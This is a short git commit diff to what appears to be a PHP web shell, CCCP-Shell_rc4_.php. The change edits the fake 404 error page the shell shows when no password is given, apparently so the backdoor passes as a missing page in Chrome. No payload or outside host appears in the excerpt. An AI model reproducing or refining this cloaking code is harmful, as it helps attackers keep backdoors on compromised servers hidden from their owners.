5bff4b51a21a9ba853f28e680584e702a3d22ad7
DSR! <xchwarze@gmail.com>
2014-07-16 23:08:28 -0300

    chrome fix

--- CCCP-Shell_rc4_.php
+++ CCCP-Shell_rc4_.php
@@ -636,7 +636,7 @@ if ($config['sPass']){
 		} else {
 			echo '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">' .
 				 '<html><head>' .
-				 '<title>404 Not Found</title>' .
+				 '<title>Not Found</title>' .
 				 '</head><body>' .
 				 '<h1>Not Found</h1>' .
 				 '<p>The requested URL ' . $_SERVER['HTTP_HOST'] . ' was not found on this server.</p>' .
